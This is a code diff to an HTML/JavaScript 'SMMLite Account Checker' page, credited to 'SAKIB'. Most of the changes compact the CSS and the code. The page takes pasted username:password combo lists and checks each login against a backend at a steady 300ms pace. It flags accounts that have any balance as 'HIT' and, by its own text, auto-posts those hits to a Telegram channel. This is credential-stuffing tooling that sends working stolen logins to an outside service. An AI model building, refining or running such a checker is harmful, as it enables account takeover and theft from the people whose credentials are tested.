@@ -5,112 +5,29 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SMMLite Checker | Auto Telegram</title>
   <style>
+    /* আপনার আগের CSS এখানে বসান – সংক্ষেপে দিচ্ছি না, আগের মতো রাখুন */
     * { box-sizing: border-box; }
-    body {
-      background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
-      font-family: 'Inter', system-ui, sans-serif;
-      margin: 0;
-      padding: 24px 16px;
-      color: #eef2ff;
-    }
+    body { background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Inter', system-ui, sans-serif; margin: 0; padding: 24px 16px; color: #eef2ff; }
     .container { max-width: 1400px; margin: 0 auto; }
-    .card {
-      background: rgba(18, 25, 45, 0.75);
-      backdrop-filter: blur(2px);
-      border-radius: 2rem;
-      border: 1px solid rgba(56, 189, 248, 0.2);
-      padding: 1.5rem;
-      margin-bottom: 2rem;
-    }
+    .card { background: rgba(18, 25, 45, 0.75); backdrop-filter: blur(2px); border-radius: 2rem; border: 1px solid rgba(56, 189, 248, 0.2); padding: 1.5rem; margin-bottom: 2rem; }
     .header-center { text-align: center; margin-bottom: 0.5rem; }
-    h1 {
-      font-size: 1.8rem;
-      background: linear-gradient(135deg, #c084fc, #38bdf8);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      margin: 0;
-    }
-    .sub-center {
-      text-align: center;
-      color: #9ca3af;
-      font-size: 0.9rem;
-    }
+    h1 { font-size: 1.8rem; background: linear-gradient(135deg, #c084fc, #38bdf8); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 0; }
+    .sub-center { text-align: center; color: #9ca3af; font-size: 0.9rem; }
     .sub-center a { color: #38bdf8; text-decoration: none; font-weight: 600; }
-    textarea {
-      width: 100%;
-      background: #0f172ad9;
-      border: 1px solid #2d3a5e;
-      border-radius: 1.25rem;
-      padding: 1rem;
-      color: #e2e8f0;
-      font-family: monospace;
-      font-size: 0.85rem;
-      resize: vertical;
-    }
-    button {
-      background: linear-gradient(95deg, #3b82f6, #2563eb);
-      border: none;
-      font-weight: 600;
-      padding: 0.7rem 1.4rem;
-      border-radius: 3rem;
-      color: white;
-      cursor: pointer;
-      margin-right: 10px;
-      margin-bottom: 10px;
-    }
+    textarea { width: 100%; background: #0f172ad9; border: 1px solid #2d3a5e; border-radius: 1.25rem; padding: 1rem; color: #e2e8f0; font-family: monospace; font-size: 0.85rem; resize: vertical; }
+    button { background: linear-gradient(95deg, #3b82f6, #2563eb); border: none; font-weight: 600; padding: 0.7rem 1.4rem; border-radius: 3rem; color: white; cursor: pointer; margin-right: 10px; margin-bottom: 10px; }
     button.secondary { background: #334155; }
-    button.filter-btn {
-      background: #1e293b;
-      border: 1px solid #334155;
-    }
-    button.filter-btn.active {
-      background: #3b82f6;
-      box-shadow: 0 0 8px rgba(59,130,246,0.5);
-    }
-    .stats {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 18px;
-      background: #0f172a80;
-      border-radius: 1.5rem;
-      padding: 1rem;
-      margin: 1rem 0;
-    }
-    .stat-card {
-      background: #111827;
-      padding: 6px 16px;
-      border-radius: 40px;
-      border-left: 3px solid #38bdf8;
-    }
+    button.filter-btn { background: #1e293b; border: 1px solid #334155; }
+    button.filter-btn.active { background: #3b82f6; box-shadow: 0 0 8px rgba(59,130,246,0.5); }
+    .stats { display: flex; flex-wrap: wrap; gap: 18px; background: #0f172a80; border-radius: 1.5rem; padding: 1rem; margin: 1rem 0; }
+    .stat-card { background: #111827; padding: 6px 16px; border-radius: 40px; border-left: 3px solid #38bdf8; }
     .stat-card.hit { border-left-color: #4ade80; }
     .stat-card.free { border-left-color: #facc15; }
     .stat-card.bad { border-left-color: #f87171; }
-    .progress-bar {
-      background: #1e293b;
-      border-radius: 60px;
-      height: 10px;
-      width: 100%;
-    }
-    .progress-fill {
-      background: linear-gradient(90deg, #38bdf8, #818cf8);
-      width: 0%;
-      height: 100%;
-      transition: width 0.2s;
-    }
-    .results-scroll {
-      max-height: 550px;
-      overflow-y: auto;
-      border-radius: 1.25rem;
-      margin-top: 1rem;
-    }
-    .result-item {
-      background: #0f172a;
-      border-radius: 1rem;
-      padding: 1rem;
-      margin-bottom: 0.75rem;
-      border-left: 4px solid;
-    }
+    .progress-bar { background: #1e293b; border-radius: 60px; height: 10px; width: 100%; }
+    .progress-fill { background: linear-gradient(90deg, #38bdf8, #818cf8); width: 0%; height: 100%; transition: width 0.2s; }
+    .results-scroll { max-height: 550px; overflow-y: auto; border-radius: 1.25rem; margin-top: 1rem; }
+    .result-item { background: #0f172a; border-radius: 1rem; padding: 1rem; margin-bottom: 0.75rem; border-left: 4px solid; }
     .result-item.hit { border-left-color: #4ade80; background: #0f2a1f40; }
     .result-item.free { border-left-color: #facc15; background: #2d2a1f40; }
     .result-item.fail { border-left-color: #f87171; opacity: 0.8; }
@@ -126,14 +43,9 @@
 <body>
 <div class="container">
   <div class="card">
-    <div class="header-center">
-      <h1>📘 SMMLite · Account Checker By SAKIB</h1>
-    </div>
-    <div class="sub-center">
-      ⚡ Config by <a href="https://t.me/shakib2016" target="_blank">@shakib2016</a> | VALID (login ok) | HIT (balance ≥ $0.003) | Auto‑post to Telegram
-    </div>
+    <div class="header-center"><h1>📘 SMMLite · Account Checker By SAKIB</h1></div>
+    <div class="sub-center">⚡ Config by <a href="https://t.me/shakib2016" target="_blank">@shakib2016</a> | VALID (login ok) | HIT (balance ≥ $0.003) | Auto‑post to Telegram</div>
   </div>
-
   <div class="card">
     <label>📋 COMBOS (username:password) — one per line</label>
     <textarea id="comboList" rows="6" placeholder="user:pass"></textarea>
@@ -143,19 +55,14 @@
       <button id="clearCombosBtn" class="secondary">🗑️ Clear Combos Only</button>
       <button id="exportTxtBtn" class="secondary">📄 Export TXT</button>
     </div>
-
     <div class="telegram-section">
       <label>🤖 Telegram Auto-Post (Active)</label>
       <div style="margin-top: 10px;">
         <button id="testTelegramBtn" class="secondary" style="background:#2b3b5c;">📡 Test Telegram Connection</button>
         <span id="testResult" style="font-size:0.7rem; margin-left:10px;"></span>
       </div>
-      <p style="font-size:0.7rem; margin-top:8px; color:#7e8ba3;">
-        ✅ HIT accounts will be automatically sent to the channel.<br>
-        Click the button above to verify the connection.
-      </p>
+      <p style="font-size:0.7rem; margin-top:8px; color:#7e8ba3;">✅ HIT accounts will be automatically sent to the channel.<br>Click the button above to verify the connection.</p>
     </div>
-
     <div class="stats">
       <div class="stat-card">📊 Total: <span id="totalCount">0</span></div>
       <div class="stat-card">✅ Checked: <span id="checkedCount">0</span></div>
@@ -166,7 +73,6 @@
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <p id="statusMsg" style="font-size:0.75rem; margin-top:12px;">⚡ Ready</p>
   </div>
-
   <div class="card">
     <div style="display: flex; flex-wrap: wrap; gap: 12px; justify-content: space-between;">
       <div>
@@ -177,12 +83,9 @@
       </div>
       <span style="font-size:0.7rem;">📋 Click COPY to copy user:pass</span>
     </div>
-    <div class="results-scroll" id="resultsContainer">
-      <div class="no-results">✨ No results yet.</div>
-    </div>
+    <div class="results-scroll" id="resultsContainer"><div class="no-results">✨ No results yet.</div></div>
   </div>
 </div>
-
 <script>
   // DOM elements
   const comboInput = document.getElementById('comboList');
@@ -213,7 +116,6 @@
   let currentFilter = 'all';
 
   function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m => m==='&'?'&amp;':m==='<'?'&lt;':'&gt;'); }
-
   function updateStatsUI() {
     totalSpan.innerText = combos.length;
     checkedSpan.innerText = checked;
@@ -225,10 +127,7 @@
   }
 
   function renderFilteredResults() {
-    if (allResults.size === 0) {
-      resultsContainer.innerHTML = '<div class="no-results">✨ No results yet.</div>';
-      return;
-    }
+    if (allResults.size === 0) { resultsContainer.innerHTML = '<div class="no-results">✨ No results yet.</div>'; return; }
     let filtered = [];
     for (let [user, data] of allResults.entries()) {
       if (currentFilter === 'all') filtered.push(data);
@@ -236,10 +135,7 @@
       else if (currentFilter === 'free' && data.valid && !data.hit) filtered.push(data);
       else if (currentFilter === 'fail' && !data.valid) filtered.push(data);
     }
-    if (!filtered.length) {
-      resultsContainer.innerHTML = `<div class="no-results">😴 No ${currentFilter.toUpperCase()} accounts.</div>`;
-      return;
-    }
+    if (!filtered.length) { resultsContainer.innerHTML = `<div class="no-results">😴 No ${currentFilter.toUpperCase()} accounts.</div>`; return; }
     let html = '';
     for (let res of filtered) {
       let rowClass = '', resultText = '', resultTagClass = '';
@@ -248,19 +144,7 @@
       else { rowClass='fail'; resultText='❌ FAIL'; resultTagClass='fail-tag'; }
       const comboPlain = `${res.username}:${res.password}`;
       const balanceText = res.balance ? `$${parseFloat(res.balance).toFixed(6)}` : '—';
-      html += `
-        <div class="result-item ${rowClass}">
-          <div class="result-header">
-            <span class="combo-text">${escapeHtml(comboPlain)}</span>
-            <button class="copy-btn" data-combo="${escapeHtml(comboPlain)}">📋 Copy</button>
-          </div>
-          <div class="result-details">
-            <span>💰 Balance: ${balanceText}</span>
-            <span class="status-tag ${resultTagClass}">${resultText}</span>
-          </div>
-          <div style="font-size:0.65rem;">${escapeHtml(res.message || '')}</div>
-        </div>
-      `;
+      html += `<div class="result-item ${rowClass}"><div class="result-header"><span class="combo-text">${escapeHtml(comboPlain)}</span><button class="copy-btn" data-combo="${escapeHtml(comboPlain)}">📋 Copy</button></div><div class="result-details"><span>💰 Balance: ${balanceText}</span><span class="status-tag ${resultTagClass}">${resultText}</span></div><div style="font-size:0.65rem;">${escapeHtml(res.message || '')}</div></div>`;
     }
     resultsContainer.innerHTML = html;
     document.querySelectorAll('.copy-btn').forEach(btn => {
@@ -288,18 +172,13 @@
         body: JSON.stringify({ username, password })
       });
       const json = await res.json();
-      return {
-        valid: json.valid === true,
-        hit: json.hit === true,
-        balance: json.balance || 0,
-        message: json.message || ''
-      };
+      return { valid: json.valid === true, hit: json.hit === true, balance: json.balance || 0, message: json.message || '' };
     } catch(err) {
       return { valid: false, hit: false, balance: 0, message: `Error: ${err.message}` };
     }
   }
 
-  // ===== সিরিয়াল রানার (৩০০ms ডিলে) – 10 Minute School স্টাইল =====
+  // ===== FIXED RUNNER – currentIdx increments properly =====
   async function runner() {
     if (!active) return;
     if (currentIdx >= combos.length) {
@@ -309,7 +188,6 @@
       statusMsg.innerText = '✅ All done.';
       return;
     }
-
     const { username, password } = combos[currentIdx];
     statusMsg.innerText = `🔍 (${currentIdx+1}/${combos.length}) ${username}`;
     const result = await checkOne(username, password);
@@ -319,10 +197,9 @@
     else fails++;
     updateStatsUI();
     addResult(username, password, result);
-    currentIdx++;
+    currentIdx++;  // important: move to next
 
     if (active && currentIdx < combos.length) {
-      // ৩০০ms ডিলে – 10 Minute School-এর মতো
       setTimeout(runner, 300);
     } else if (currentIdx >= combos.length) {
       active = false;
@@ -333,6 +210,7 @@
   }
 
   function start() {
+    // Reset everything for fresh start
     const lines = comboInput.value.split(/\r?\n/);
     const newCombos = [];
     for (let line of lines) {
@@ -347,7 +225,7 @@
     if (!newCombos.length) { statusMsg.innerText = '❌ No valid combos'; return; }
     combos = newCombos;
     currentIdx = 0;
-    checked = hits = frees = fails = 0;
+    checked = 0; hits = 0; frees = 0; fails = 0;
     allResults.clear();
     updateStatsUI();
     renderFilteredResults();
